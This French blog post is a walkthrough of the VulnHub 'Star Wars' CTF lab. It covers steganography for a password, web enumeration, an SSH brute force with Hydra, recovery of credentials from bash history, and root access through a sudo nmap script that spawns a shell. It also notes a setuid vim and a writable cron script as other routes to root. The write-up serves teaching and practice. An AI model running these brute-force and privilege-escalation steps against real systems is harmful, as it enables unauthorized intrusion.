---
title: "Solution du CTF Star Wars de VulnHub"
tags: [CTF, VulnHub]
---

[Star Wars CTF](https://vulnhub.com/entry/star-wars-ctf-1,528/) n'était pas vraiment le top des CTFs. Il y a un peu de guessing, un peu de stéganographie, bref tout pour plomber un CTF mais ça restait dans les limites de l'acceptable.

## Le nom d'utilisateur trouver tu dois

On arrive sur un site web avec des images de _Yoda_. En regardant le code HTML on voit qu'il s'agit du même fichier.

On voit aussi en bas de page un commentaire avec du base64 :

```html
<!--the password is in here 
MDExMTAxMDAgMDExMDEwMDAgMDExMD--- snip ---MDExMTEgMDExMTAwMTAgMDExMDAxMDA=
-->
```

Il se décode en différents groupes de 0 et de 1 que je décode à l'aide de [Binary decoder: Online binary to text translator - cryptii](https://cryptii.com/pipes/binary-decoder). J'obtiens alors ceci : `thisisnothepassword`

Je décide de m'aventurer côté stéganographie avec `steganoveritas` :

```console
$ docker run -v /tmp:/data -it --rm bannsec/stegoveritas
stegoveritas@87dde1782d67:~$ stegoveritas /data/yoda.png 
Running Module: SVImage
+---------------------------+------+
|        Image Format       | Mode |
+---------------------------+------+
| Portable network graphics | RGBA |
+---------------------------+------+
Found something worth keeping!
ASCII text, with no line terminators
Found something worth keeping!
dBase III DBT, version number 0, next free block index 2478313616
Found something worth keeping!
dBase III DBT, version number 0, next free block index 2239798725
Found something worth keeping!
ISO-8859 text, with very long lines, with no line terminators
Found something worth keeping!
ISO-8859 text, with very long lines, with no line terminators
Found something worth keeping!
ISO-8859 text, with very long lines, with no line terminators
Found something worth keeping!
ISO-8859 text, with very long lines, with no line terminators
Found something worth keeping!
ISO-8859 text, with very long lines, with no line terminators
Found something worth keeping!
ISO-8859 text, with very long lines, with no line terminators
Found something worth keeping!
ISO-8859 text, with very long lines, with no line terminators
--- snip ---
Running Module: MultiHandler

Found something worth keeping!
PNG image data, 480 x 481, 8-bit/color RGBA, non-interlaced
+--------+------------------+-------------------------------------------+-----------+
| Offset | Carved/Extracted | Description                               | File Name |
+--------+------------------+-------------------------------------------+-----------+
| 0x29   | Carved           | Zlib compressed data, default compression | 29.zlib   |
| 0x29   | Extracted        | Zlib compressed data, default compression | 29        |
+--------+------------------+-------------------------------------------+-----------+
Exif
====
+---------------------+---------------------------+
| key                 | value                     |
+---------------------+---------------------------+
| SourceFile          | /data/yoda.png            |
| ExifToolVersion     | 11.88                     |
| FileName            | yoda.png                  |
| Directory           | /data                     |
| FileSize            | 525 kB                    |
| FileModifyDate      | 2023:05:14 08:57:29+00:00 |
| FileAccessDate      | 2023:05:14 08:57:34+00:00 |
| FileInodeChangeDate | 2023:05:14 08:57:29+00:00 |
| FilePermissions     | rw-r--r--                 |
| FileType            | PNG                       |
| FileTypeExtension   | png                       |
| MIMEType            | image/png                 |
| ImageWidth          | 480                       |
| ImageHeight         | 481                       |
| BitDepth            | 8                         |
| ColorType           | RGB with Alpha            |
| Compression         | Deflate/Inflate           |
| Filter              | Adaptive                  |
| Interlace           | Noninterlaced             |
| ImageSize           | 480x481                   |
| Megapixels          | 0.231                     |
+---------------------+---------------------------+
stegoveritas@87dde1782d67:~$ file results/keepers/*
results/keepers/1684054806.279453-26d1429a599e3f16ff10165e744b78b1:  ASCII text, with no line terminators
results/keepers/1684054810.5461836-42138caa2637cf9ba3746d9ff8789d74: dBase III DBT, version number 0, next free block index 2478313616
results/keepers/1684054813.7895858-1a651a7fcf44dbe77bbb3cc61ea4f719: dBase III DBT, version number 0, next free block index 2239798725
results/keepers/1684054817.0371363-503ad3c31909cd45fbcde9e0e5533a8e: ISO-8859 text, with very long lines, with no line terminators
results/keepers/1684054817.9183621-232d2ebadcbc80113f8c49b15b70d340: ISO-8859 text, with very long lines, with no line terminators
results/keepers/1684054818.2679336-d812135462837e75836f01f74c57df6a: ISO-8859 text, with very long lines, with no line terminators
results/keepers/1684054818.9468045-ff4b0525b513f48dc0b1186141449b2f: ISO-8859 text, with very long lines, with no line terminators
results/keepers/1684054819.60675-ec312b9c328d04384a43ff82f6c1c394:   ISO-8859 text, with very long lines, with no line terminators
results/keepers/1684054820.248347-807e3a9e14f1a03b7f4b4d115e73041e:  ISO-8859 text, with very long lines, with no line terminators
results/keepers/1684054820.5530763-81f5d0062aa52aa26640fa402070281a: ISO-8859 text, with very long lines, with no line terminators
results/keepers/1684054820.776711-85624f9c48151a270b8881ffb534d4b3:  ASCII text, with no line terminators
results/keepers/1684054821.483414-105d7b56c2b1a2c180d9249f911431a1:  ISO-8859 text, with very long lines, with no line terminators
results/keepers/1684054830.7927747-ff76fa513865fa10baec69c3b3174680: PNG image data, 480 x 481, 8-bit/color RGBA, non-interlaced
results/keepers/29:                                                  empty
results/keepers/29.zlib:                                             zlib compressed data
stegoveritas@87dde1782d67:~$ cat results/keepers/1684054806.279453-26d1429a599e3f16ff10165e744b78b1
the real password is babyYoda123
```

Youpi, on a un mot de passe, mais pas de noms d'utilisateurs...

## Han bâté

Via une énumération web je trouve un fichier `robots.txt` qui a l'entrée suivante :

> Why does the Jedi Order keep checking the robots.txt file.
> Might take a look at /r2d2
> He is the real OG.

Dans la page `/r2d2` on trouve un vrai charabia, comme si *Yoda* avait vidé la bouteille de *Jägermeister*.

Pour trouver un nom d'utilisateur valide il faut là énumérer comme un âne bâté et on finit par trouver un fichier  `/users.js` à la racine (pas sous le dossier `/javascript`, c'est vrai que ce serait trop logique...).

On a finalement nos noms d'utilisateurs :

```
skywalker
han
```

On peut se connecter avec `han` / `babyYoda123`.

L'utilisateur a un historique bash mais une partie des fichiers mentionnés est absent, que faut-il en penser ?

```bash
han@starwars:~$ cat .bash_history 
sudo su
ls -al
mkdir .secrets 
ls 
ls -al
cd .secrets/
ls -al
touch firsthalf.txt 
touch note.txt
echo first half of the password is: luke12 >> firsthalf.txt 
cat firsthalf.txt 
echo Darth knows everything >> note.txt 
exit
cd .secrets/
cat  firsthalf.txt 
exit
ls
cd .secrets/
ls
rm firsthalf.txt 
cat note.txt 
echo "r2d2 thinks you're a cewl kid, what about anakin?" > note.txt 
cat note.txt 
echo "Anakin is a cewl kid." > note.txt 
cat note.txt 
cd ..
su Darth
sudo -l
su Dart
```

Sur le système il y a deux autres utilisateurs :

```
skywalker:x:1001:1001::/home/skywalker:/bin/bash
Darth:x:1002:1002::/home/Darth:/bin/bash
```

Il y a toujours cette référence à _CeWL_, un outil qui extrait les mots d'une page :

```console
han@starwars:~/.secrets$ cat note.txt 
Anakin is a cewl kid.
```

J'ai décidé d'appliquer ça à la page de charabia, mais en utilisant un code Python maison :

```python
import string

import requests
from bs4 import BeautifulSoup

def extract_words(text):
    # Remove punctuation marks
    text = text.translate(str.maketrans('', '', string.punctuation))
    # Split into words
    words = text.split()
    return words

response = requests.get("http://192.168.56.199/r2d2")
content = BeautifulSoup(response.text, "html.parser").get_text()
words = sorted(set(extract_words(content)))
for word in words:
    print(word)
```

## Utilise la force brute

Hydra trouve un match pour le compte `skywalker` :

```console
$ hydra -L users.txt -P words.txt ssh://192.168.56.199
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-14 11:29:48
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1074 login tries (l:3/p:358), ~68 tries per task
[DATA] attacking ssh://192.168.56.199:22/
[STATUS] 122.00 tries/min, 122 tries in 00:01h, 954 to do in 00:08h, 14 active
[STATUS] 98.67 tries/min, 296 tries in 00:03h, 780 to do in 00:08h, 14 active
[22][ssh] host: 192.168.56.199   login: skywalker   password: tatooine
[STATUS] 105.29 tries/min, 737 tries in 00:07h, 339 to do in 00:04h, 14 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-14 11:40:55
```

Là encore un historique est accessible :

```console
skywalker@starwars:~/.secrets$ cat note.txt 
Darth must take up the job of being a good father
skywalker@starwars:~/.secrets$ cat ../.bash_history 
ls
ls -al
exit
ls -al
mkdir .secrets
cd /root
ls -al
cd .secrets/
touch secondhalf.txt
echo clone50 >> secondhalf.txt 
touch note.txt
echo go to Darth >> note.txt 
exit
ls
cd 
ls
cd .secrets/
ls
rm secondhalf.txt 
cat note.txt 
echo "Darth must take up the job of being a good father" > note.txt 
cat note.txt 
strace
su Darth
service cron status
sl
ls
cat evil.py 
nano evil.py 
cat evil.py 
nano evil.py 
ps
cp evil.py evil1.py 
su Darth
id
su Darth
cat note.txt 
su
```

On a les deux parties d'un mot de passe, ce qui nous permet de nous connecter avec `Darth` / `luke12clone50`.

Cet utilisateur peut scanner le réseau via `sudo` :

```console
Darth@starwars:~$ sudo -l
Matching Defaults entries for Darth on starwars:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User Darth may run the following commands on starwars:
    (ALL) NOPASSWD: /usr/bin/nmap
```

Il y a un GTFObin pour Nmap :

```console
Darth@starwars:~$ echo 'os.execute("/bin/sh")' > yolo
Darth@starwars:~$ sudo /usr/bin/nmap --script=yolo
Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-14 09:22 EDT
NSE: Warning: Loading 'yolo' -- the recommended file extension is '.nse'.
# uid=0(root) gid=0(root) groups=0(root)
# # Desktop  Documents  Downloads  flag.txt  Music      nmap-4.53.tar.bz2.2  Pictures  Public  Templates  Videos
#     .-.
                      |_:_|
                     /(_Y_)\
.                   ( \/M\/ )
 '.               _.'-/'-'\-'._
   ':           _/.--'[[[[]'--.\_
     ':        /_'  : |::"| :  '.\
       ':     //   ./ |oUU| \.'  :\
         ':  _:'..' \_|___|_/ :   :|
           ':.  .'  |_[___]_|  :.':\
            [::\ |  :  | |  :   ; : \
             '-'   \/'.| |.' \  .;.' |
             |\_    \  '-'   :       |
             |  \    \ .:    :   |   |
             |   \    | '.   :    \  |
             /       \   :. .;       |
            /     |   |  :__/     :  \\
           |  |   |    \:   | \   |   ||
          /    \  : :  |:   /  |__|   /|
      snd |     : : :_/_|  /'._\  '--|_\
          /___.-/_|-'   \  \
                         '-'

I hope you liked it Padawan :)
```

## Autres solutions

`Vi` est setuid root :

```console
Darth@starwars:~$ ls -al /usr/bin/vim.tiny
-rwsrwsrwx 1 root root 1200696 Jun 15  2019 /usr/bin/vim.tiny
```

On peut donc l'utiliser pour lire / éditer `/etc/passwd` ou `/etc/passwd` et passer root ou tout simplement obtenir le flag.

Il est possible aussi d'utiliser une entrée de crontab de l'utilisateur `Darth` :

```bash
* * * * * python /home/Darth/.secrets/evil.py
```

Le script est modifiable par les membres du groupe `anakin` :

```console
Darth@starwars:~$ ls -al /home/Darth/.secrets/evil.py
-rwxrw-r-- 1 Darth anakin 105 Jul 24  2020 /home/Darth/.secrets/evil.py
```

On peut donc passer de `skywalker` à `Darth` en modifiant le script Python, car `skywalker` est membre du groupe :

```console
Darth@starwars:~$ id skywalker 
uid=1001(skywalker) gid=1001(skywalker) groups=1001(skywalker),2000(anakin)
```
